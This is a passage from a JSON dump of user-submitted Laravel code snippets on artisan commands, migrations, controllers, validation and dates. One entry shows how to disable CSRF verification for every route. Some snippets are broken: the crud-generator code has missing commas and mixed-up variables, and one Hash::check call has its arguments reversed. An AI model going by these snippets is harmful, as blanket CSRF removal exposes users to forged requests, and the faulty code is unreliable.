    "description": "# If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\n# The easiest way to create a model instance is using the  # make:model Artisan command:  php artisan make:model Flight  # If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\n$user = User::create([     'first_name' => 'Taylor',     'last_name' => 'Otwell',     'title' => 'Developer', ]);\nphp artisan make:model Flight\nphp artisan make:model Flight --factory php artisan make:model Flight -f  php artisan make:model Flight --seed php artisan make:model Flight -s  php artisan make:model Flight --controller php artisan make:model Flight -c  php artisan make:model Flight -mfsc\n$model = App\\Models\\Flight::where('legs', '>', 100)             ->firstOr(['id', 'legs'], function () {                 // ...             });\n",
    "reg_date": "2021-10-12T10:15:47.000Z"
  },
  {
    "id": 2187,
    "keyword": null,
    "link": null,
    "title": " laravel create controller command",
    "description": "php artisan make:controller MyController\nphp artisan make:controller UserController\nphp artisan make:controller NameController\nphp artisan make:controller ShowProfile\nphp artisan make:controller PhotoController --resource --model=Photo\n <?php  namespace App\\Console\\Commands;  use Illuminate\\Console\\Command; use App\\Http\\Controllers\\HelloWorldController;  class MakeImportsCommand extends Command {     /**      * The name and signature of the console command.      *      * @var string      */     protected $signature = 'helloworld';      /**      * The console command description.      *      * @var string      */     protected $description = 'Say Hello World Controller';      /**      * Create a new command instance.      *      * @return void      */     public function __construct()     {         parent::__construct();     }      /**      * Execute the console command.      *      * @return mixed      */     public function handle()     {         return $this -> helloWorld();      } } \n",
    "reg_date": "2021-10-12T10:15:47.000Z"
  },
  {
    "id": 2188,
    "keyword": null,
    "link": null,
    "title": " laravel create migration",
    "description": "php artisan make:migration create_users_table \n// use the make:migration Artisan command to generate a database migration php artisan make:migration create_flights_table  // use --create to indicate whether the migration will be creating a new table php artisan make:migration create_flights_table --create=flights  // use --table to indicate the table name php artisan make:migration add_destination_to_flights_table --table=flights\nphp artisan make:migration create_users_table --create=users  php artisan make:migration add_votes_to_users_table --table=users\nphp artisan make:migration create_flights_table\nphp artisan make:migration add_votes_to_users_table --table=users  php artisan make:migration create_users_table --create=users\nphp artisan make:Model Status -m\n",
    "reg_date": "2021-10-12T10:15:47.000Z"
  },
  {
    "id": 2189,
    "keyword": null,
    "link": null,
    "title": " laravel create migration add column",
    "description": "php artisan make:migration add_paid_to_users_table --table=users    public function up() {     Schema::table('users', function($table) {         $table->integer('paid');     }); }  public function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }  php artisan migrate\nphp artisan make:migration add_paid_to_users_table --table=users\npublic function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }\nphp artisan make:migration add_profile_to_users\nSchema::table('table_name', function (Blueprint $table) {             $table->string('column_name', 255)->nullable()->after('previous_column_name');         });\nSchema::table('users', function (Blueprint $table) { \t$table->dateTime('verify_date')->nullable()->after(\"password_updated_at\"); });\n",
    "reg_date": "2021-10-12T10:15:47.000Z"
  },
  {
    "id": 2190,
    "keyword": null,
    "link": null,
    "title": " laravel create model",
    "description": "# Create a new Drink model. php artisan make:model Drink \n# If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\n# The easiest way to create a model instance is using the  # make:model Artisan command:  php artisan make:model Flight  # If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\nphp artisan make:model Flight\nphp artisan make:model ModelName\n// If there's a flight from Oakland to San Diego, set the price to $99. // If no matching model exists, create one. $flight = App\\Models\\Flight::updateOrCreate(     ['departure' => 'Oakland', 'destination' => 'San Diego'],     ['price' => 99, 'discounted' => 1] );\n",
    "reg_date": "2021-10-12T10:15:47.000Z"
  },
  {
    "id": 2191,
    "keyword": null,
    "link": null,
    "title": " laravel create model and migration",
    "description": "php artisan make:model Model_Name -m\nphp artisan make:model ModelName --migration\nphp artisan make:model Settings -m\n# If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\nphp artisan make:model Flight\nphp artisan make:Model Status -m\n",
    "reg_date": "2021-10-12T10:15:47.000Z"
  },
  {
    "id": 2192,
    "keyword": null,
    "link": null,
    "title": " laravel create model controller and migration on line",
    "description": "php artisan make:model Todo -mcr \n# to make only Model Class php artisan make:model Customer  # to make resource controller php artisan make:controller CustomersController --resource  # make controller for already existing Model Class (binded to model) php artisan make:controller CustomersController --model=Customer  # to make  model, migration and controller and factory all in one command php artisan make:model Modelname -crmf\nphp artisan make:model ModelName -mcr\nphp artisan make:model Todo -a\n",
    "reg_date": "2021-10-12T10:15:48.000Z"
  },
  {
    "id": 2193,
    "keyword": null,
    "link": null,
    "title": " laravel create new file if not exists",
    "description": "if (!file_exists('somefile.txt')) {     touch('somefile.txt', strtotime('-1 days')); }\n",
    "reg_date": "2021-10-12T10:15:48.000Z"
  },
  {
    "id": 2194,
    "keyword": null,
    "link": null,
    "title": " laravel create new migration",
    "description": "php artisan make:migration create_users_table \nSchema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); }); OR Schema::table('posts', function (Blueprint $table) {     $table->foreignId('user_id')->constrained(); });\nphp artisan make:migration create_flights_table\nphp artisan migrate:refresh  php artisan migrate:refresh --seed\nphp artisan make:migration add_votes_to_users_table --table=users  php artisan make:migration create_users_table --create=users\nphp artisan make:Model Status -m\n",
    "reg_date": "2021-10-12T10:15:48.000Z"
  },
  {
    "id": 2195,
    "keyword": null,
    "link": null,
    "title": " laravel create new request",
    "description": "$myRequest = new \\Illuminate\\Http\\Request(); $myRequest->setMethod('POST'); //default METHOD $myRequest->request->add(['foo' => 'bar']); dd($request->foo);\n",
    "reg_date": "2021-10-12T10:15:48.000Z"
  },
  {
    "id": 2196,
    "keyword": null,
    "link": null,
    "title": " laravel create observer",
    "description": "php artisan make:observer nameOfObserver --model=modelName\nnamespace App;  use Illuminate\\Database\\Eloquent\\Model;  class Post extends Model {     protected $table = 'posts';      protected $fillable = ['title', 'slug', 'content'];      protected static function boot()     {         parent::boot();         static::saving(function ($model) {             $model->slug = str_slug($model->title);         });     } }\nphp artisan make:observer UserObserver --model=User\n<?php  namespace App\\Observers;  use App\\Models\\User;  class UserObserver {     /**      * Handle the User \"created\" event.      *      * @param  \\App\\Models\\User  $user      * @return void      */     public function created(User $user)     {         //     }      /**      * Handle the User \"updated\" event.      *      * @param  \\App\\Models\\User  $user      * @return void      */     public function updated(User $user)     {         //     }      /**      * Handle the User \"deleted\" event.      *      * @param  \\App\\Models\\User  $user      * @return void      */     public function deleted(User $user)     {         //     }      /**      * Handle the User \"forceDeleted\" event.      *      * @param  \\App\\Models\\User  $user      * @return void      */     public function forceDeleted(User $user)     {         //     } }\n<?php  namespace App\\Providers;  use App\\Observers\\UserObserver; use App\\Models\\User; use Illuminate\\Support\\ServiceProvider;  class AppServiceProvider extends ServiceProvider {     /**      * Register any application services.      *      * @return void      */     public function register()     {         //     }      /**      * Bootstrap any application services.      *      * @return void      */     public function boot()     {         User::observe(UserObserver::class);     } }\n",
    "reg_date": "2021-10-12T10:15:48.000Z"
  },
  {
    "id": 2197,
    "keyword": null,
    "link": null,
    "title": " laravel create or update",
    "description": "//if there is id => 1 for user role , update this and if there is not  //id => 1 create it and insert some data for it  $data = $request->all();    UserRule::updateOrCreate(             ['id' => 1],             $data         );\n// If there's a flight from Oakland to San Diego, set the price to $99. // If no matching model exists, create one. $flight = App\\Flight::updateOrCreate(     ['departure' => 'Oakland', 'destination' => 'San Diego'],     ['price' => 99, 'discounted' => 1] );\n# The easiest way to create a model instance is using the  # make:model Artisan command:  php artisan make:model Flight  # If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\n$user = User::updateOrCreate(['name' => request()->name], [      'foo' => request()->foo ]); \n// Retrieve flight by name, or create it if it doesn't exist... $flight = App\\Flight::firstOrCreate(['name' => 'Flight 10']);  // Retrieve flight by name, or create it with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrCreate(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );  // Retrieve by name, or instantiate... $flight = App\\Flight::firstOrNew(['name' => 'Flight 10']);  // Retrieve by name, or instantiate with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrNew(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );\n// If there's a flight from Oakland to San Diego, set the price to $99. // If no matching model exists, create one. $flight = App\\Models\\Flight::updateOrCreate(     ['departure' => 'Oakland', 'destination' => 'San Diego'],     ['price' => 99, 'discounted' => 1] );\n",
    "reg_date": "2021-10-12T10:15:48.000Z"
  },
  {
    "id": 2198,
    "keyword": null,
    "link": null,
    "title": " laravel create password hash",
    "description": "$password = Hash::make('yourPa$$w0rd');\n$data = User::find($id); if( ! Hash::check( $data->password , Input::get('currPassword') ) ) {     return Redirect::to('/admin/profile')         ->with('message', 'Current Password Error !')         ->withInput(); } \n$password = Input::get('passwordformfield'); // password is form field $hashed = Hash::make($password); \n",
    "reg_date": "2021-10-12T10:15:48.000Z"
  },
  {
    "id": 2199,
    "keyword": null,
    "link": null,
    "title": " laravel create project",
    "description": "composer create-project laravel/laravel example-app\ncomposer create-project --prefer-dist laravel/laravel blog \"6.*\"\n// To install and use a specific version, you can enter it at the end of the command. // For example using version 5.8 ==> composer create-project --prefer-dist laravel/laravel projectName \"5.8.*\"\ncomposer global require laravel/installer  laravel new blog\ncomposer global require laravel/installer  laravel new example-app  cd example-app  php artisan serve\ncomposer create-project --prefer-dist laravel/laravel blog \n",
    "reg_date": "2021-10-12T10:15:48.000Z"
  },
  {
    "id": 2200,
    "keyword": null,
    "link": null,
    "title": " laravel create project command",
    "description": "composer create-project --prefer-dist laravel/laravel blog \"6.*\"\ncomposer global require laravel/installer  laravel new blog\ncomposer create-project --prefer-dist laravel/laravel testingproject \"5.8.*\"\nBefore starting this hope you installed composer dependancy manager for PHP. -----------------------------------------------------------------------------  So if you want to create a project by name of 'first_laravel_app' in directory C:/xampp/htdocs/ then what you need to do is  Locate your project parent directory using cmd >cd c:/xampp/htdocs  and fire this command  >composer create-project laravel/laravel first_laravel_app --prefer-dist  And its done, this is really easy and it also creates Application Key automatically for you.    # I hope it will help you. # Namaste \n// 3 ways to create project in laravel composer create-project --prefer-dist laravel/laravel APIDemo   laravel new laravel-backend-api   composer global require laravel/installer\n",
    "reg_date": "2021-10-12T10:15:48.000Z"
  },
  {
    "id": 2201,
    "keyword": null,
    "link": null,
    "title": " laravel create project thorugh composer",
    "description": "composer create-project --prefer-dist laravel/laravel:^7.0 blog \ncomposer create-project --prefer-dist laravel/laravel blog \"6.*\"\ncomposer create-project --prefer-dist laravel/laravel blog    //here blog is you project name you can change this figure    //to whatever you want to make the name of your project   \n",
    "reg_date": "2021-10-12T10:15:48.000Z"
  },
  {
    "id": 2202,
    "keyword": null,
    "link": null,
    "title": " laravel create resource controller",
    "description": "php artisan make:controller PhotoController --resource --model=Photo\nphp artisan make:controller RequestRevisionController --resource \nResource Controller:This controller will create all CRUD methods php artisan make:controller nameOfController --resource\nphp artisan make:model -a -r modelName\n<?php ...     /**         * Store a newly created resource in storage.         *         * @return Response         */     public function store()     {         // validate         // read more on validation at http://laravel.com/docs/validation         $rules = array(             'name'       => 'required',             'email'      => 'required|email',             'shark_level' => 'required|numeric'         );         $validator = Validator::make(Input::all(), $rules);          // process the login         if ($validator->fails()) {             return Redirect::to('sharks/create')                 ->withErrors($validator)                 ->withInput(Input::except('password'));         } else {             // store             $shark = new shark;             $shark->name       = Input::get('name');             $shark->email      = Input::get('email');             $shark->shark_level = Input::get('shark_level');             $shark->save();              // redirect             Session::flash('message', 'Successfully created shark!');             return Redirect::to('sharks');         }     } ...\n",
    "reg_date": "2021-10-12T10:15:48.000Z"
  },
  {
    "id": 2203,
    "keyword": null,
    "link": null,
    "title": " laravel create search",
    "description": "public function index(){       // // we need to show all data from \"blog\" table       // $blogs = Blog::all();       // // show data to our view       // return view('blog.index',['blogs' => $blogs]);        $search = Request::get('search');       $blogs = Blog::where('title','like','%'.$search.'%')->orderBy('id')->paginate(6);       return view('blog.index',['blogs' => $blogs]);     } \n@extends('app')   @section('content')   <div class=\"form-group row add\">     <div class=\"col-md-6\">       <h1>Simple Laravel Ajax Crud</h1>     </div>     <div class=\"col-md-6\">       {!! Form::open(['method'=>'GET','url'=>'blog','class'=>'navbar-form navbar-left','role'=>'search']) !!}       <div class=\"input-group custom-search-form\">         <input type=\"text\" name=\"search\" class=\"form-control\" placeholder=\"Search ....\">         <span class=\"input-group-btn\">           <button type=\"submit\" class=\"btn btn-default-sm\">             <i class=\"fa fa-search\"></i>           </button>         </span>       </div>       {!! Form::close() !!}     </div>   </div>    <div class=\"form-group row add\">     <div class=\"col-md-5\">       <input type=\"text\" class=\"form-control\" id=\"title\" name=\"title\"       placeholder=\"Your title Here\" required>       <p class=\"error text-center alert alert-danger hidden\"></p>     </div>     <div class=\"col-md-5\">       <input type=\"text\" class=\"form-control\" id=\"description\" name=\"description\"       placeholder=\"Your description Here\" required>       <p class=\"error text-center alert alert-danger hidden\"></p>     </div>     <div class=\"col-md-2\">       <button class=\"btn btn-warning\" type=\"submit\" id=\"add\">         <span class=\"glyphicon glyphicon-plus\"></span> Add New Data       </button>     </div>   </div>    <div class=\"row\">     <div class=\"table-responsive\">       <table class=\"table table-borderless\" id=\"table\">         <tr>           <th>No.</th>           <th>Title</th>           <th>Description</th>           <th>Actions</th>         </tr>         {{ csrf_field() }}          <?php $no=1; ?>         @foreach($blogs as $blog)           <tr class=\"item{{$blog->id}}\">             <td>{{$no++}}</td>             <td>{{$blog->title}}</td>             <td>{{$blog->description}}</td>             <td>             <button class=\"edit-modal btn btn-primary\" data-id=\"{{$blog->id}}\" data-title=\"{{$blog->title}}\" data-description=\"{{$blog->description}}\">               <span class=\"glyphicon glyphicon-edit\"></span> Edit             </button>             <button class=\"delete-modal btn btn-danger\" data-id=\"{{$blog->id}}\" data-title=\"{{$blog->title}}\" data-description=\"{{$blog->description}}\">               <span class=\"glyphicon glyphicon-trash\"></span> Delete             </button>           </td>           </tr>         @endforeach       </table>       {!! $blogs->links() !!}     </div>   </div>   <div id=\"myModal\" class=\"modal fade\" role=\"dialog\">     <div class=\"modal-dialog\">       <div class=\"modal-content\">         <div class=\"modal-header\">           <button type=\"button\" class=\"close\" data-dismiss=\"modal\">&times;</button>             <h4 class=\"modal-title\"></h4>         </div>         <div class=\"modal-body\">           <form class=\"form-horizontal\" role=\"form\">             <div class=\"form-group\">               <label class=\"control-label col-sm-2\" for=\"id\">ID :</label>               <div class=\"col-sm-10\">                 <input type=\"text\" class=\"form-control\" id=\"fid\" disabled>               </div>               </div>               <div class=\"form-group\">               <label class=\"control-label col-sm-2\" for=\"title\">Title:</label>               <div class=\"col-sm-10\">                 <input type=\"name\" class=\"form-control\" id=\"t\">               </div>             </div>             <div class=\"form-group\">             <label class=\"control-label col-sm-2\" for=\"description\">Description:</label>             <div class=\"col-sm-10\">               <input type=\"name\" class=\"form-control\" id=\"d\">             </div>           </div>           </form>             <div class=\"deleteContent\">             Are you Sure you want to delete <span class=\"title\"></span> ?             <span class=\"hidden id\"></span>           </div>           <div class=\"modal-footer\">             <button type=\"button\" class=\"btn actionBtn\" data-dismiss=\"modal\">               <span id=\"footer_action_button\" class='glyphicon'> </span>             </button>             <button type=\"button\" class=\"btn btn-warning\" data-dismiss=\"modal\">               <span class='glyphicon glyphicon-remove'></span> Close             </button>           </div>         </div>       </div>     </div>   </div>   @stop \n",
    "reg_date": "2021-10-12T10:15:49.000Z"
  },
  {
    "id": 2204,
    "keyword": null,
    "link": null,
    "title": " laravel create symbolic link storage",
    "description": "php artisan storage:link\n",
    "reg_date": "2021-10-12T10:15:49.000Z"
  },
  {
    "id": 2205,
    "keyword": null,
    "link": null,
    "title": " laravel create table with model command line",
    "description": "php artisan make:model Create_table -m  \n",
    "reg_date": "2021-10-12T10:15:49.000Z"
  },
  {
    "id": 2206,
    "keyword": null,
    "link": null,
    "title": " laravel create trigger migration",
    "description": "<?php  use Illuminate\\Database\\Migrations\\Migration;  class CreateTrigger extends Migration {     public function up()     {         DB::unprepared('                 CREATE TRIGGER tr_after_main_insert AFTER INSERT ON `main` FOR EACH ROW                     BEGIN                         INSERT INTO `test`(`new_id`, `type`, `value`, `created_at`) VALUES (NEW.id, NEW.type, 1, NOW());                     END                 ');     }      public function down()     {         DB::unprepared('DROP TRIGGER `tr_after_main_insert`');     } }\n",
    "reg_date": "2021-10-12T10:15:49.000Z"
  },
  {
    "id": 2207,
    "keyword": null,
    "link": null,
    "title": " laravel createmany example",
    "description": "$post = Post::find(1);  $post->comments()->createMany([     ['message' => 'A new comment.'],     ['message' => 'Another new comment.'], ]);\n",
    "reg_date": "2021-10-12T10:15:49.000Z"
  },
  {
    "id": 2208,
    "keyword": null,
    "link": null,
    "title": " laravel crud generator",
    "description": "//visit https://github.com/NirajBasnyat/crudstarter\n<?php  namespace App\\Http\\Controllers;  use Illuminate\\Http\\Request; use App\\Ticket;  class TicketController extends Controller {     /**      * Display a listing of the resource.      *      * @return \\Illuminate\\Http\\Response      */     public function index()     {         $patients = Patient::where('user_id', auth()->user()->id)->get();                  return view('patients.index',compact('patients'));     }      /**      * Show the form for creating a new resource.      *      * @return \\Illuminate\\Http\\Response      */     public function create()     {         return view('patients.create');     }      /**      * Store a newly created resource in storage.      *      * @param  \\Illuminate\\Http\\Request  $request      * @return \\Illuminate\\Http\\Response      */     public function store(Request $request)     {         $ticket = new Patient();         $data = $this->validate($request, [             'name'=>'required',             'surname'=> 'required'             'id_number'=> 'required'         ]);                 $patient->savePatient($data);         return redirect('/home')->with('success', 'New patient has been succesfully created');     }      /**      * Display the specified resource.      *      * @param  int  $id      * @return \\Illuminate\\Http\\Response      */     public function show($id)     {         //     }      /**      * Show the form for editing the specified resource.      *      * @param  int  $id      * @return \\Illuminate\\Http\\Response      */     public function edit($id)     {         $patient = Patient::where('user_id', auth()->user()->id)                         ->where('id', $id)                         ->first();          return view('patients.edit', compact('patient', 'id'));     }      /**      * Update the specified resource in storage.      *      * @param  \\Illuminate\\Http\\Request  $request      * @param  int  $id      * @return \\Illuminate\\Http\\Response      */     public function update(Request $request, $id)     {         $patient = new Patient();         $data = $this->validate($request, [             'name'=>'required',             'surname'=> 'required'             'id_number'=> 'required'         ]);         $data['id'] = $id;         $patient->updatePatient($data);          return redirect('/home')->with('success', 'Patient Information was updated succesfully');     }      /**      * Remove the specified resource from storage.      *      * @param  int  $id      * @return \\Illuminate\\Http\\Response      */     public function destroy($id)     {         $patient = Patient::find($id);         $patient->delete();          return redirect('/home')->with('success', 'The patient has been deleted!!');     } }\n@extends('layouts.app')  @section('content') <div class=\"container\">     <table class=\"table table-striped\">         <thead>             <tr>               <td>ID</td>               <td>Title</td>               <td>Description</td>               <td colspan=\"2\">Action</td>             </tr>         </thead>         <tbody>             @foreach($patients as $patient)             <tr>                 <td>{{$ticket->id}}</td>                 <td>{{$ticket->name}}</td>                 <td>{{$ticket->surname}}</td>                 <td><a href=\"{{action(PatientController@edit',$patient->id)}}\" class=\"btn btn-primary\">Edit</a></td>                 <td>                     <form action=\"{{action('PatientController@destroy', $patient->id)}}\" method=\"post\">                     {{csrf_field()}}                     <input name=\"_method\" type=\"hidden\" value=\"DELETE\">                     <button class=\"btn btn-danger\" type=\"submit\">Delete</button>                     </form>                 </td>             </tr>             @endforeach         </tbody>     </table> <div> @endsection\n",
    "reg_date": "2021-10-12T10:15:49.000Z"
  },
  {
    "id": 2209,
    "keyword": null,
    "link": null,
    "title": " laravel csrf-token in view",
    "description": "{{ csrf_token() }} {{ csrf_field() }}\n<head>      <meta name=\"csrf-token\" content=\"{{ csrf_token() }}\" />  </head>\n<form method=\"POST\" action=\"/profile\">     @csrf     <input name=\"name\">   \t<button type=\"submit\">send</button> </form>\n",
    "reg_date": "2021-10-12T10:15:49.000Z"
  },
  {
    "id": 2210,
    "keyword": null,
    "link": null,
    "title": " laravel csrf token off",
    "description": "{{ csrf_token() }} {{ csrf_field() }}\n<head>      <meta name=\"csrf-token\" content=\"{{ csrf_token() }}\" />  </head>\n//In laravel 7. Open file \\App\\Http\\Middleware\\VerifyCsrfToken.php //Disable for all routes  protected $except = [     '*', ]; //Disable for some routes  protected $except = [     'mobile/*',     'news/articles', ]; //I searched for a long time how to disable CSRF completely, //there are many identical examples but they do not help\n<form method=\"POST\" action=\"/profile\">     @csrf     <input name=\"name\">   \t<button type=\"submit\">send</button> </form>\n<?php  namespace App\\Http\\Middleware;  use Illuminate\\Foundation\\Http\\Middleware\\VerifyCsrfToken as Middleware;  class VerifyCsrfToken extends Middleware {     /**      * The URIs that should be excluded from CSRF verification.      *      * @var array      */     protected $except = [         'stripe/*',         'http://example.com/foo/bar',         'http://example.com/foo/*',     ]; }\n",
    "reg_date": "2021-10-12T10:15:49.000Z"
  },
  {
    "id": 2211,
    "keyword": null,
    "link": null,
    "title": " laravel curl request",
    "description": "$client = new GuzzleHttp\\Client;  $response = $client->get('https://api.example.com/api/AvailabilitySearch', [     'headers' => [         'Authorization' => 'Bearer YOUR_TOKEN_HERE',     ],     'form_params' => [         'VisitDate' => '2017-05-08',         'PartySize' => '2',         'ChannelCode' => 'ONLINE',     ], ]);  // You need to parse the response body // This will parse it into an array $response = json_decode($response->getBody(), true);  /////////////////////////////////////////////////////  $endpoint = \"http://my.domain.com/test.php\"; $client = new \\GuzzleHttp\\Client(); $id = 5; $value = \"ABC\";  $response = $client->request('GET', $endpoint, ['query' => [     'key1' => $id,      'key2' => $value, ]]);  // url will be: http://my.domain.com/test.php?key1=5&key2=ABC;  $statusCode = $response->getStatusCode(); $content = $response->getBody();  // or when your server returns json // $content = json_decode($response->getBody(), true);\n",
    "reg_date": "2021-10-12T10:15:49.000Z"
  },
  {
    "id": 2212,
    "keyword": null,
    "link": null,
    "title": " laravel current timestamp",
    "description": " Carbon::now()->timestamp\nuse Carbon\\Carbon; $current_date_time = Carbon::now()->toDateTimeString(); // Produces something like \"2019-03-11 12:25:00\" \n$user = User::find(1); $user->profile_views_count = 123; $user->timestamps = false; $user->save();\n",
    "reg_date": "2021-10-12T10:15:49.000Z"
  },
  {
    "id": 2213,
    "keyword": null,
    "link": null,
    "title": " laravel custom model primary Key",
    "description": "class UserVerification extends Model {     protected $primaryKey = 'your_key_name'; // or null      public $incrementing = false;      // In Laravel 6.0+ make sure to also set $keyType     protected $keyType = 'string'; } \n",
    "reg_date": "2021-10-12T10:15:49.000Z"
  },
  {
    "id": 2214,
    "keyword": null,
    "link": null,
    "title": " laravel custom validation message",
    "description": "$rules = [         'name' => 'required',         'email' => 'required|email',         'message' => 'required|max:250',     ];      $customMessages = [         'required' => 'The :attribute field is required.'     ];      $this->validate($request, $rules, $customMessages);\n$this->validate([   'userid' =>'required|min:3|max:100',   'username' =>'required|min:3',   'password' =>'required|max:15|confirmed', ], [], [   'userid' => 'User ID' ]);\n @if ($errors->any())     <div class=\"alert alert-danger\">         <ul>             @foreach ($errors->all() as $error)                 <li>{{ $error }}</li>             @endforeach         </ul>     </div> @endif \nif (request('event') == null) {     $validator->errors()->add('event', 'Please select an event'); }\n$rules = [         'name' => 'required',         'email' => 'required|email',         'message' => 'required|max:250',     ];      $customMessages = [         'required' => 'The :attribute field is required.'     ];      $this->validate($request, $rules, $customMessages); \n/**  * Store a new blog post.  *  * @param  Request  $request  * @return Response  */ public function store(Request $request) {     $validatedData = $request->validate([         'title' => 'required|unique:posts|max:255',         'body' => 'required',     ]);      // The blog post is valid... }\n",
    "reg_date": "2021-10-12T10:15:50.000Z"
  },
  {
    "id": 2215,
    "keyword": null,
    "link": null,
    "title": " laravel database seeder",
    "description": "#All of them php artisan db:seed #One class php artisan db:seed --class=UserSeeder\nphp artisan db:seed --class=UserSeeder\nphp artisan make:seeder NameOfTheSeeder\nphp artisan migrate:fresh --seed\nphp artisan make:seeder UsersTableSeeder\n<?php  use Illuminate\\Database\\Seeder; use Illuminate\\Support\\Facades\\DB; use Illuminate\\Support\\Facades\\Hash; use Illuminate\\Support\\Str;  class DatabaseSeeder extends Seeder {     /**      * Run the database seeds.      *      * @return void      */     public function run()     {         DB::table('users')->insert([             'name' => Str::random(10),             'email' => Str::random(10).'@gmail.com',             'password' => Hash::make('password'),         ]);     } }\n",
    "reg_date": "2021-10-12T10:15:50.000Z"
  },
  {
    "id": 2216,
    "keyword": null,
    "link": null,
    "title": " laravel database seeder medium",
    "description": "php artisan make:seeder NameOfTheSeeder\nphp artisan make:seeder ArticlesTableSeeder\nphp artisan db:seed --force\n",
    "reg_date": "2021-10-12T10:15:50.000Z"
  },
  {
    "id": 2217,
    "keyword": null,
    "link": null,
    "title": " laravel datatable format date column",
    "description": "$projects = Project::select('id', 'name', 'date_start', 'date_end'); return Datatables::of($projects)   ->editColumn('date_start', function ($request) {     return $request->date_start->format('Y-m-d'); // human readable format   })   ->editColumn('date_end', function ($request) {     return $request->date_end->format('Y-m-d'); // human readable format   })   ->filterColumn('date_start', function ($query, $keyword) {     $query->whereRaw(\"DATE_FORMAT(date_start,'%Y-%m-%d') like ?\", [\"%$keyword%\"]); //date_format when searching using date   })   ->filterColumn('date_end', function ($query, $keyword) {     $query->whereRaw(\"DATE_FORMAT(date_end,'%Y-%m-%d') like ?\", [\"%$keyword%\"]); //date_format when searching using date   })   ->make(true);\n",
    "reg_date": "2021-10-12T10:15:50.000Z"
  },
  {
    "id": 2218,
    "keyword": null,
    "link": null,
    "title": " laravel date between",
    "description": "$from = date('2018-01-01'); $to = date('2018-05-02');  Reservation::whereBetween('reservation_from', [$from, $to])->get();\n$from = date('2018-01-01'); $to = date('2018-05-02');  Reservation::whereBetween('reservation_from', [$from, $to])->get(); \nnamespace App\\Http\\Controllers;  use App\\Mail\\CheckUser; use App\\User; use Carbon\\Carbon; use Illuminate\\Http\\Request; use PDF;  class TestController extends Controller {     public function index()     {           return view('welcome');     }      public function daily_report(Request $request)     {        $start_date = Carbon::parse($request->start_date)                              ->toDateTimeString();         $end_date = Carbon::parse($request->end_date)                              ->toDateTimeString();         return User::whereBetween('created_at', [          $start_date, $end_date        ])->get();     } }\n// how to get dates between two dates in laravel?  //NOTE => for this you can use Carbon use Carbon\\CarbonPeriod;  $period = CarbonPeriod::create(\"2020-5-20\", \"2020-5-30\"); foreach ($period as $date) {   // Insert Dates into listOfDates Array   $listOfDates[] = $date->format('Y-m-d'); }  // Now You Can Review This Array dd($listOfDates); \n",
    "reg_date": "2021-10-12T10:15:50.000Z"
  },
  {
    "id": 2219,
    "keyword": null,
    "link": null,
    "title": " laravel date default now",
    "description": "$table->timestamp('created_at')->default(DB::raw('CURRENT_TIMESTAMP')); \n",
    "reg_date": "2021-10-12T10:15:50.000Z"
  },
  {
    "id": 2220,
    "keyword": null,
    "link": null,
    "title": " laravel date rule before 18 years ago",
    "description": " public function rules() {     return      [       ...       'issued_date' => [                 'required',                 'date_format:' . config('panel.date_format'),                 'after:-18 years'           ],       ...     ]; }\n",
    "reg_date": "2021-10-12T10:15:50.000Z"
  },
  {
    "id": 2221,
    "keyword": null,
    "link": null,
    "title": " laravel date set timezone",
    "description": " Inside config/app.php  replace timezone  'timezone' => 'Asia/Kolkata'\nedit /config/app.php 'timezone' => 'Asia/Dhaka' \nIn Laravel Application, You can set your Application Time Zone by configuring app.php file in config folder. To change time zone , modify the value of timezone in config/app.php file.  by default &lsquo;timezone&rsquo; => &lsquo;UTC&rsquo;,  /*    |--------------------------------------------------------------------------    | Application Timezone    |--------------------------------------------------------------------------    |    | Here you may specify the default timezone for your application, which    | will be used by the PHP date and date-time functions. We have gone    | ahead and set this to a sensible default for you out of the box.    |    */    'timezone' => 'UTC', For Ex : i set my application time zone is &lsquo;Asia/Kolkata&rsquo;  'timezone' => 'Asia/Kolkata', List of available timezones can be find in following URL http://php.net/manual/en/timezones.php\nInside env add DB config DB_TIMEZONE=+08:00\n",
    "reg_date": "2021-10-12T10:15:50.000Z"
  },
  {
    "id": 2222,
    "keyword": null,
    "link": null,
    "title": " laravel date validation",
    "description": "//inside laravel request rules(), add this for phone number varification 'phone' => 'required|min:11|numeric',\n $request->validate([         'start_date' => 'date_format:d/m/Y',         'end_date' => 'date_format:d/m/Y'     ]);\n'dob' => 'required|date_format:Y-m-d|after_or_equal:1920-01-01'\n @if ($errors->any())      @foreach ($errors->all() as $error)          <div>{{$error}}</div>      @endforeach  @endif \n 'day'            =>  'required|date',\n/**  * Bootstrap any application services.  *  * @return void  */ public function boot() {     Validator::extend(...);      Validator::replacer('foo', function ($message, $attribute, $rule, $parameters) {         return str_replace(...);     }); }\n",
    "reg_date": "2021-10-12T10:15:50.000Z"
  },
  {
    "id": 2223,
    "keyword": null,
    "link": null,
    "title": " laravel dateinterval not found",
    "description": "use DateTime; use DatePeriod; use DateInterval;\n",
    "reg_date": "2021-10-12T10:15:50.000Z"
  },
  {
    "id": 2224,
    "keyword": null,
    "link": null,
    "title": " laravel datepicker date format",
    "description": "<script src=\"https://code.jquery.com/jquery-1.12.4.js\"></script> <script src=\"https://code.jquery.com/ui/1.12.1/jquery-ui.js\"></script> <script>     $( function() {         $('.date').datepicker();             }); </script> \n",
    "reg_date": "2021-10-12T10:15:51.000Z"
  },
  {
    "id": 2225,
    "keyword": null,
    "link": null,
    "title": " laravel db::query update",
